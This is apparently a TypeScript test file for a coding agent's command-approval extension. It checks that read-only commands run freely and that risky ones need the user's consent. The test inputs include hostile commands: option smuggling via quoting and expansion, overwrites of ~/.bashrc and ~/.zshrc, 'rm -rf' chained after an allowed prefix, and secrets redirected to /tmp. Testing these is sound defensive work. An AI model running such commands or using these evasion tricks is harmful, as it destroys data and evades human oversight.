import { describe, expect, it } from "vitest";
import { commandAllowPattern, commandMatchesPattern, isCommandAllowed } from "../src/core/command-allow-list.ts";
import type { ExtensionAPI, ExtensionContext } from "../src/core/extensions/types.ts";
import type { Settings } from "../src/core/settings-schema.ts";
import {
	type ApprovalRecord,
	type AskForApproval,
	createApprovalsExtension,
} from "../src/extensions/approvals/index.ts";
import { builtInExtensions } from "../src/extensions/index.ts";
import type { ApprovalAnswer } from "../src/modes/interactive/components/approval-box.ts";

type Handler = (event: unknown, ctx: ExtensionContext) => Promise<unknown>;

function setup(answers: ApprovalAnswer[], settings: Settings = {}) {
	const asked: string[] = [];
	const ask: AskForApproval = async (_ctx, request) => {
		asked.push(`${request.command} [${request.allowPattern}] ${request.reason}`);
		const answer = answers.shift();
		if (!answer) throw new Error("unexpected question");
		return answer;
	};
	let handler: Handler | undefined;
	const records: Array<{ customType: string; data: ApprovalRecord }> = [];
	const api = {
		on: (event: string, fn: Handler) => {
			if (event === "tool_call") handler = fn;
			return () => {};
		},
		getSettings: () => settings,
		appendEntry: (customType: string, data: ApprovalRecord) => records.push({ customType, data }),
	} as unknown as ExtensionAPI;
	createApprovalsExtension({ ask })(api);
	const call = (command: string, mode: ExtensionContext["mode"] = "tui", toolName = "bash") =>
		handler!({ type: "tool_call", toolCallId: "t1", toolName, input: { command } }, {
			mode,
			hasUI: mode === "tui" || mode === "rpc",
			sessionManager: { getSessionId: () => "session-1" },
		} as unknown as ExtensionContext);
	return { asked, call, records };
}

/** Calls each command, answering No, and returns the ones that ran without asking. */
async function ranWithoutAsking(commands: readonly string[]): Promise<string[]> {
	const { asked, call } = setup(commands.map(() => ({ decision: "deny" }) as const));
	for (const command of commands) await call(command);
	const askedCommands = new Set(asked.map((line) => line.slice(0, line.indexOf(" ["))));
	return commands.filter((command) => !askedCommands.has(command));
}

describe("approvals extension", () => {
	it("is a built-in extension", () => {
		expect(builtInExtensions.map((extension) => extension.name)).toContain("approvals");
	});

	it("runs read-only commands from the default allow list without asking", async () => {
		const { asked, call } = setup([]);
		expect(await call("git status")).toBeUndefined();
		expect(await call("rg rateLimit src/")).toBeUndefined();
		expect(asked).toEqual([]);
	});

	it("asks before built-in commands whose arguments can run a program or write a file", async () => {
		const dangerous = [
			// rg runs a preprocessor program on every file.
			"rg --pre sh x .",
			"rg --pre=sh x .",
			"rg --pre-glob '*' --pre sh x",
			// fd runs programs (-x, -X) and tree writes files (-o): both are off the built-in list.
			"fd . -x curl -o /tmp/p https://example.test/p",
			"fd -X sh /tmp/p",
			"fd foo",
			"tree -o ~/.zshrc",
			"tree",
			// git writes the diff to a file or runs an external diff program, also through abbreviations.
			"git diff --output=~/.bashrc",
			"git diff --output /tmp/x",
			"git diff --outp=/tmp/x",
			"git log -p --output=/tmp/x",
			"git show --output=/tmp/x HEAD",
			"git diff --ext-diff",
			"git diff --ext",
			"git -c core.pager=sh log",
			"git --exec-path=/tmp status",
			// git branch only lists: no delete, move, force or creating a branch.
			"git branch -D main",
			"git branch -d main",
			"git branch --delete main",
			"git branch -m main old",
			"git branch -M main",
			"git branch --move main old",
			"git branch -f main HEAD~3",
			"git branch --force main",
			"git branch new-feature",
			// file compiles a magic file; date sets the clock.
			"file -C -m magic",
			"file -bC x",
			"date -s 2020-01-01",
			"date --set=2020-01-01",
			"date 0101000020",
		];
		expect(await ranWithoutAsking(dangerous)).toEqual([]);
	});

	it("asks when quoting, expansion or a glob could hide an option from the check", async () => {
		const hidden = [
			'git diff "--output=/tmp/x"',
			"git diff '--output'=/tmp/x",
			"git diff --out\\put=/tmp/x",
			// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion, not a template
			"git diff --${unset}output=/tmp/x",
			"git diff $'\\x2d-output=/tmp/x'",
			"git diff {--output=/tmp/x,}",
			// A file named --pre=sh in the folder would become an option.
			"rg foo *",
			"rg foo ?-pre=sh",
		];
		expect(await ranWithoutAsking(hidden)).toEqual([]);
	});

	it("still runs read-only uses of the built-in commands without asking", async () => {
		const readOnly = [
			"ls -la src",
			"ls *.ts",
			'grep -rn "rate limit" src',
			"cat package.json",
			"rg -n rateLimit src/ --type ts",
			"rg --no-ignore -tts rateLimit",
			"git status --short",
			"git diff --stat HEAD~1",
			"git diff --no-ext-diff",
			"git log --oneline -5",
			"git show HEAD:package.json",
			"git branch",
			"git branch -a",
			"git branch -vv",
			"git branch --show-current",
			"git branch --list",
			"git rev-parse --show-toplevel",
			"date",
			"date -u +%Y-%m-%dT%H:%M:%S",
			"file -b README.md",
		];
		const { asked, call } = setup([]);
		for (const command of readOnly) expect(await call(command)).toBeUndefined();
		expect(asked).toEqual([]);
	});

	it("records each decision in the session, not the built-in read-only commands", async () => {
		const { call, records } = setup(
			[{ decision: "allow_once" }, { decision: "allow_always" }, { decision: "deny", message: "use make test" }],
			{ approvals: { allow: ["npm test"] } },
		);
		await call("git status");
		await call("make build");
		await call("pnpm vitest run a.test.ts");
		await call("pnpm vitest run b.test.ts");
		await call("npm test -- --watch=false");
		await call("make deploy");
		expect(records.map(({ customType, data }) => ({ customType, ...data }))).toEqual([
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "make build",
				pattern: "make build",
				decision: "allow_once",
			},
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "pnpm vitest run a.test.ts",
				pattern: "pnpm vitest",
				decision: "allow_always",
			},
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "pnpm vitest run b.test.ts",
				pattern: "pnpm vitest",
				decision: "allowed_by_rule",
				rule: "session",
			},
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "npm test -- --watch=false",
				pattern: "npm test",
				decision: "allowed_by_rule",
				rule: "settings",
			},
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "make deploy",
				pattern: "make deploy",
				decision: "deny",
				message: "use make test",
			},
		]);
	});

	it("asks before a command outside the allow list and runs it on Yes", async () => {
		const { asked, call } = setup([{ decision: "allow_once" }, { decision: "allow_once" }]);
		expect(await call("pnpm vitest run src/server/routes/auth.test.ts")).toBeUndefined();
		expect(await call("pnpm vitest run src/server/routes/auth.test.ts")).toBeUndefined();
		expect(asked).toEqual([
			"pnpm vitest run src/server/routes/auth.test.ts [pnpm vitest] Not in your allow list.",
			"pnpm vitest run src/server/routes/auth.test.ts [pnpm vitest] Not in your allow list.",
		]);
	});

	it("remembers always allow for the rest of the session", async () => {
		const { asked, call } = setup([{ decision: "allow_always" }]);
		expect(await call("pnpm vitest run a.test.ts")).toBeUndefined();
		expect(await call("pnpm vitest run b.test.ts")).toBeUndefined();
		expect(asked).toHaveLength(1);
	});

	it("blocks on No and tells the model what the user said", async () => {
		const { call } = setup([{ decision: "deny", message: "use the existing helper" }, { decision: "deny" }]);
		expect(await call("npm install left-pad")).toEqual({
			block: true,
			reason: "The user did not allow this command and said what to do instead: use the existing helper",
		});
		expect(await call("npm install left-pad")).toEqual({
			block: true,
			reason: "The user did not allow this command.",
		});
	});

	it("always asks for chained or redirected commands, even with an allowed prefix", async () => {
		const { asked, call } = setup([{ decision: "allow_once" }, { decision: "allow_once" }]);
		await call("git status && rm -rf build");
		await call("cat secrets.txt > /tmp/out");
		expect(asked).toHaveLength(2);
	});

	it("asks only in the terminal", async () => {
		const { asked, call } = setup([]);
		expect(await call("make deploy", "print")).toBeUndefined();
		expect(await call("make deploy", "rpc")).toBeUndefined();
		expect(await call("make deploy", "json")).toBeUndefined();
		expect(asked).toEqual([]);
	});

	it("follows the approvals setting", async () => {
		const never = setup([], { approvals: { commands: "never" } });
		expect(await never.call("make deploy")).toBeUndefined();
		const allow = setup([], { approvals: { allow: ["npm test"] } });
		expect(await allow.call("npm test -- --watch=false")).toBeUndefined();
		expect(never.asked.concat(allow.asked)).toEqual([]);
	});

	it("leaves other tools alone", async () => {
		const { asked, call } = setup([]);
		expect(await call("anything", "tui", "read")).toBeUndefined();
		expect(asked).toEqual([]);
	});
});

describe("command allow list", () => {
	it("matches whole leading words only", () => {
		expect(commandMatchesPattern("git status", "git status --short")).toBe(true);
		expect(commandMatchesPattern("git status", "git stash")).toBe(false);
		expect(commandMatchesPattern("ls", "lsof -i")).toBe(false);
		expect(commandMatchesPattern("", "ls")).toBe(false);
		expect(isCommandAllowed("echo $(rm -rf x)", ["echo"])).toBe(false);
		expect(commandAllowPattern("  pnpm   vitest run x ")).toBe("pnpm vitest");
	});
});
